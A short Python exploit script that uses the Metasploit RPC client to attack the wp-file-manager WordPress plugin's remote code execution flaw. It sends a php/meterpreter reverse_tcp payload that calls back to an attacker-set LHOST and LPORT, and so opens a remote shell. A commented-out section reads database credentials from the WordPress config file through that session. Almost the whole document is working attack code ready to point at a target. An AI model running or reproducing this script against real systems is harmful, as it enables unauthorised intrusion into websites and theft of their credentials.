#!/usr/bin/python3

"""
The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for 
WordPress allows remote attackers to upload and execute arbitrary 
PHP code because it renames an unsafe example elFinder connector 
file to have the .php extension. This, for example, allows attackers 
to run the elFinder upload (or mkfile and put) command to write PHP 
code into the wp-content/plugins/wp-file-manager/lib/files/ 
directory.
"""

from pymetasploit3.msfrpc import MsfRpcClient
import sys
from config import *

client=MsfRpcClient(PWD, port=55552)
exploit = client.modules.use('exploit', 'multi/http/wp_file_manager_rce') 
print(exploit.description)
exploit['RHOSTS']=sys.argv[1]
exploit['RPORT']=80
exploit['TARGETURI']='/blog'
payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
payload['LHOST']= LHOST
payload['LPORT']= LPORT
var = exploit.execute(payload=payload)
print(var)
if var['job_id']==None:
    print("Exploit fallito")
else:
    print("Exploit riuscito")
    """while len(client.sessions.list)==0:
        print('No session active')
    session = client.sessions.list
    for s in session.keys():
        print(s)
        shell = client.sessions.session(s)
        print(shell)
        shell.write('shell')
        print(shell.read())
        shell.write('cd /etc/wordpress')
        shell.write('cat config-default.php | grep DB')
        print(shell.read())"""
        






